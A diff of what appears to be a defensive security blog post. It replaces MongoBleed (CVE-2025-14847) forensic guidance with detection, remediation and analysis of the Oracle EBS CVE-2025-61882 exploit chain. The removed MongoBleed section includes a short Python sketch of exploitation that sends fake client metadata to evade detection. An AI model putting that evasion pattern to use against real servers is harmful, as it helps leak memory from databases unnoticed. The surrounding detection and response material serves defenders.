+  - Monitor `/support/*` endpoints
+  - Have class names mimicking legitimate libraries (Log4j, Jackson, etc.)
+  - Were registered outside of normal application deployment processes
+  - Reference external class loaders or encrypted payloads
 
-**Velociraptor Artifact** [Linux.Detection.CVE202514847.MongoBleed](https://docs.velociraptor.app/exchange/artifacts/pages/linux.detection.cve202514847.mongobleed/)
-Developed by Eric Capuano at Recon InfoSec, this artifact parses MongoDB logs using Velociraptor's incident response platform.
+- Inspect WebLogic server memory for loaded classes that don't correspond to deployed application code. The SAGE chain loads classes dynamically at runtime with names designed to blend in (`com.fasterxml.jackson.pb.FileUtils`, `Log4jConfigQpgsubFilter`). These won't appear in your deployed WAR/EAR files but will be present in the JVM's loaded class list.
 
-```bash
-$ velociraptor artifacts collect \
-    Linux.Detection.CVE202514847.MongoBleed \
-    --args LogPath=/var/log/mongodb/ \
-    --args TimeWindow=3600 \
-    --args MetadataThreshold=0.1 \
-    --args VelocityThreshold=1000
-```
+- Review administrative account activity during the exploitation window. Rotate credentials for any accounts that showed anomalous behavior, especially the `applmgr` account which was commonly used for reconnaissance.
 
-**Standalone Script** [Neo23x0/mongobleed-detector](https://github.com/Neo23x0/mongobleed-detector) 
-Developed by Florian Roth (creator of THOR APT Scanner), this shell script analyzes MongoDB JSON logs offline.
+- Check for signs of lateral movement from the EBS server to other systems. Even if the initial compromise is contained, attackers may have pivoted elsewhere in the environment.
 
-```bash
-git clone https://github.com/Neo23x0/mongobleed-detector.git
-cd mongobleed-detector
-chmod +x mongobleed-detector.sh
-./mongobleed-detector.sh /var/log/mongodb/
-```
+- Implement enhanced logging and monitoring for Oracle EBS, specifically around:
+  - Servlet activity (especially UiServlet)
+  - Database template creation/modification
+  - Administrative session creation
+  - Outbound network connections
 
-Both tools analyze the same behavioral signatures: connection velocity and metadata absence. Both suffer from the same limitations: log dependency, evasion susceptibility, and inability to quantify breach impact.
+**For Unsupported Versions:**
 
-## Evasion Considerations
+If you're running an unsupported Oracle EBS version, Oracle won't provide patches. Your options are:
 
-The metadata-based detection is effective against the public PoC but not against adaptive attackers. A motivated threat actor can modify the exploit to send fake client metadata after connecting, making the traffic appear more legitimate.
+1. Upgrade to a supported version (the only legitimate long-term solution)
+2. Completely remove EBS from any network with internet connectivity
+3. Implement aggressive compensating controls (WAF with custom rules, strict network segmentation, continuous monitoring)
 
-Modified exploitation that evades metadata-based detection:
+None of these are great. Unsupported software in production is technical debt that will eventually come due, and CVE-2025-61882 is exactly how that bill arrives.
 
-```python
-def exploit_with_metadata_evasion(target_host, target_port):
-    """MongoBleed exploit with fake metadata to evade detection."""
-    sock = socket.create_connection((target_host, target_port))
-    metadata = build_fake_metadata({
-        'driver': {'name': 'PyMongo', 'version': '4.6.1'},
-        'os': {'type': 'Linux', 'name': 'Ubuntu', 'version': '22.04'},
-        'platform': 'CPython 3.11.7'
-    })
-    sock.send(metadata)
-    malicious_payload = craft_mongobleed_payload(offset=1000)
-    sock.send(malicious_payload)
-    response = sock.recv(8192)
-    leaked_data = parse_bson_for_memory(response)
-    sock.close()
-    return leaked_data
-```
+## Closing Assessment
 
-This reduces exploitation speed but improves stealth. Detection based solely on metadata absence fails against this variant. The velocity signature remains, but high-throughput legitimate applications may trigger false positives, creating alert fatigue.
+CVE-2025-61882 represents the kind of vulnerability that gives enterprise software defenders nightmares. It's a multi-stage exploit chain that bypasses authentication, works remotely, requires no user interaction, and was burned as a zero-day by organized crime groups for at least two months before anyone knew it existed.
 
-The uncomfortable truth: **detection identifies exploitation attempts with the public PoC, not all exploitation, and definitely not data exfiltration success**.
+The fact that Cl0p successfully weaponized this and exfiltrated data from multiple organizations, before Oracle released a patch highlights a fundamental problem: detection lag. Even with mature security programs, application-layer exploitation can fly under the radar when telemetry gaps exist. Traditional EDR and network monitoring miss the initial compromise because it looks like legitimate application behavior until it's too late.
 
-### Remediation and Workarounds
+The deployment of custom fileless malware (GOLDVEIN.JAVA and the SAGE chain) demonstrates that these weren't opportunistic criminals, these were skilled operators with deep Java and Oracle expertise. The SAGE infection chain in particular is sophisticated: a three-stage, memory-resident implant framework with reflective loading, encrypted payloads, and servlet filter-based persistence. That's not something you build in a weekend.
 
-Eliminate the exposure of the MongoDB service
-## Patching
+What makes this worse is that Oracle EBS is exactly the kind of target attackers love: it holds crown jewel data (financial records, customer info, employee data), it's deployed in complex enterprise environments with significant attack surface, and it's maintained by teams who often prioritize uptime over rapid patching. The result? A two-month window where threat actors had free rein.
 
-Apply the fixed versions:
-- 8.2.3, 8.0.17, 7.0.28, 6.0.27, 5.0.32, 4.4.30
+The silver lining, if there is one, is that this exploit chain required genuine expertise to develop. This wasn't an obvious bug. It required deep knowledge of Oracle EBS internals, careful chaining of multiple weaknesses, and sophisticated understanding of HTTP protocol manipulation. That suggests the barrier to entry for exploitation was relatively high, at least until the exploit leaked publicly.
 
-If you're on end-of-life versions (3.6, 4.0, 4.2), you need to upgrade to a supported version. There's no patch coming.
+But now? The exploit is out there. Multiple research groups have reproduced it. GitHub repos exist with detection artifacts. The cat is extremely out of the bag, and anyone with basic Python skills can run this against exposed EBS instances.
 
-## Workaround: Disable zlib Compression
+For defenders, the takeaway is clear: patch now if you haven't already. If you can't patch, isolate your EBS deployment like it's radioactive until you can. And if you're still running unsupported versions, stop kidding yourself, migrate to something supported or accept that you're running an internet-connected liability.
 
-If immediate patching isn't possible, disable zlib compression:
+As for Oracle? This incident raises uncomfortable questions about their secure development lifecycle and the fact that such a critical exploit chain existed in shipping code. EBS is mature software. These aren't subtle memory corruption bugs in obscure features, this is SSRF, CRLF injection, path traversal, and unsafe XML processing in a core component. That's not a great look.
 
-```yaml
-# mongod.conf - Disable zlib compression
-net:
-  compression:
-    compressors: snappy  # Remove 'zlib' from list
-```
+The good news: Oracle eventually patched it. The bad news: they patched it after threat actors had already weaponized it in the wild, and only after public pressure from incident responders and extortion victims forced their hand. That's not the response timeline you want from a critical vulnerability in enterprise software deployed across global corporations.
 
-Or via command line:
+Bottom line: CVE-2025-61882 is fixed, but the damage is done. Hunt for compromise, patch aggressively, and remember that "defense in depth" isn't just a buzzword, it's the only thing standing between your ERP system and ransomware operators with functioning exploits.
 
-```bash
-mongod --networkMessageCompressors snappy
-```
+---
+## References
 
-This prevents exploitation but may impact performance in bandwidth-constrained environments. The trade-off between security and performance isn't always straightforward, especially in high-throughput production systems.
-
-## Forensic Readiness Improvements
-
-For organizations running MongoDB in production, the following baseline configurations improve forensic capability:
-
-**For Community Edition:**
-- Increase verbosity from default `-1` to `0` minimum
-- Enable JSON logging (default in 4.4+)
-- Forward MongoDB logs to a SIEM or centralized logging system
-- Retain logs for a minimum of 90 days (not 7-14 days)
-- Implement network flow logging for all database connections
-
-**For Enterprise Edition:**
-- Enable audit logging
-- Configure audit filters to capture authentication and query events
-- Forward audit logs to tamper-proof storage
-- Implement real-time alerting on suspicious patterns
-
-## Post-Exploitation Response Checklist
-
-When MongoBleed exploitation is confirmed:
-
-```markdown
-### Confirmed Exploitation Response
-
-## Immediate Actions
-- [ ] Isolate affected MongoDB instances from the network
-- [ ] Preserve all available logs before rotation
-- [ ] Snapshot VM/container for forensic analysis
-- [ ] Document timeline of detected exploitation attempts
-- [ ] Verify MongoDB edition (Community vs Enterprise)
-- [ ] Check audit logging status if Enterprise
-
-## Evidence Collection
-- [ ] Collect all MongoDB JSON logs (entire retention period)
-- [ ] Check current verbosity level: `db.getLogComponents()`
-- [ ] If verbosity was `-1`, acknowledge limited forensic evidence
-- [ ] Grep logs for NETWORK, ACCESS, and COMMAND events
-- [ ] Collect MongoDB audit logs (if enabled and Enterprise)
-- [ ] Collect system logs (auth.log, syslog, kern.log)
-- [ ] Collect network flow data (NetFlow, firewall logs)
-- [ ] Collect process execution logs (auditd, sysmon)
-
-## Scope Assessment (Edition-Dependent)
-- [ ] Identify all source IPs with suspicious connection patterns
-- [ ] Correlate exploitation timeframe with other security events
-- [ ] Review what data was in memory during exposure window
-- [ ] Assess credential/token exposure risk
-- [ ] **If Community Edition**: Assume worst-case data access
-- [ ] **If Enterprise with audit**: Analyze actual operations performed
-
-## Credential Rotation (Assume Compromise)
-- [ ] Rotate all MongoDB authentication credentials
-- [ ] Rotate application database credentials
-- [ ] Rotate API keys/tokens that may have been in heap memory
-- [ ] Review and rotate service account credentials
-- [ ] Search for use of old credentials in authentication logs
-
-## Lateral Movement Analysis
-- [ ] Check for unauthorized access using potentially leaked credentials
-- [ ] Review authentication logs across environment for suspicious activity
-- [ ] Scan for indicators of compromise across infrastructure
-- [ ] Assess blast radius if credentials were reused elsewhere
-- [ ] **If audit logs available**: Identify specific collections accessed
-- [ ] **If no audit logs**: Assume all data potentially compromised
-```
-
-The "assume compromise" approach isn't paranoia. It's practical. Memory disclosure vulnerabilities leak unpredictable data. Without complete visibility into heap state at the time of exploitation, conservative assumptions are appropriate.
-
-### Closing Assessment
-
-MongoBleed is trivial to exploit, widely applicable, and difficult to investigate forensically. The exploitation mechanics are straightforward. The forensic artifacts are clear when the public proof-of-concept is used. They become ambiguous when attackers adapt their tooling.
-
-Three forensic realities define this vulnerability:
-
-1. **Detection identifies exploitation attempts, not data exfiltration success**  
-   You can see connections. You might see authentication. You probably can't see what was in the heap when it was leaked.
-
-2. **Log retention determines investigation feasibility more than detection sophistication**  
-   Detection scripts are useless if the logs rotated before you ran them.
-
-3. **Memory disclosure scope cannot be determined definitively after the fact**  
-   The heap is dynamic. What was leaked depends on what was there. You can't prove what wasn't there.
-
-The gap between "we detected exploitation attempts" and "we know what data was compromised" is where incident response breaks down. Detection is useless without evidence. Evidence is useless without retention. Retention is useless without analysis capability. Analysis capability requires the right edition with the right configuration.
-
-If you're running Community Edition with default verbosity at `-1` and 7-day log retention, your forensic visibility is effectively zero. You might see high connection volumes in firewall logs. You won't see what happened next.
-
-Patch if you can. Disable zlib if you can't. Improve your logging before you need it. And maybe consider whether Community Edition is giving you the forensic capability you think you have.
-
-### References
-
-- **Vulnerability Disclosure**: [OX Security](https://www.ox.security/blog/attackers-could-exploit-zlib-to-exfiltrate-data-cve-2025-14847/)
-- **Original PoC**: [joe-desimone/mongobleed](https://github.com/joe-desimone/mongobleed)
-- **Detection Research**: [Eric Capuano - Hunting MongoBleed](https://blog.ecapuano.com/p/hunting-mongobleed-cve-2025-14847)
-- **Detection Tool**: [Neo23x0/mongobleed-detector](https://github.com/Neo23x0/mongobleed-detector)
+- [Oracle Security Alert Advisory - CVE-2025-61882](https://www.oracle.com/security-alerts/alert-cve-2025-61882.html)
+- [Malware Analysis with Dingus](https://blog.dingusxmcgee.com/blog/2025/10/06/Its-Java-All-The-Way-Down.html)
+- [watchTowr Labs: "Well, Well, Well. It's Another Day. (Oracle E-Business Suite Pre-Auth RCE Chain - CVE-2025-61882)](https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882)
+- [CrowdStrike: "CrowdStrike Identifies Campaign Targeting Oracle E-Business Suite via Zero-Day Vulnerability Tracked as CVE-2025-61882](https://www.crowdstrike.com/en-us/blog/crowdstrike-identifies-campaign-targeting-oracle-e-business-suite-zero-day-CVE-2025-61882/)
+- [Google Cloud / Mandiant: "Oracle E-Business Suite Zero-Day Exploited in Widespread Extortion Campaign](https://cloud.google.com/blog/topics/threat-intelligence/)oracle-ebusiness-suite-zero-day-exploitation
+- [PICUS Oracle EBS CVE-2025-61882](https://www.picussecurity.com/resource/blog/oracle-ebs-cve-2025-61882-vulnerability)
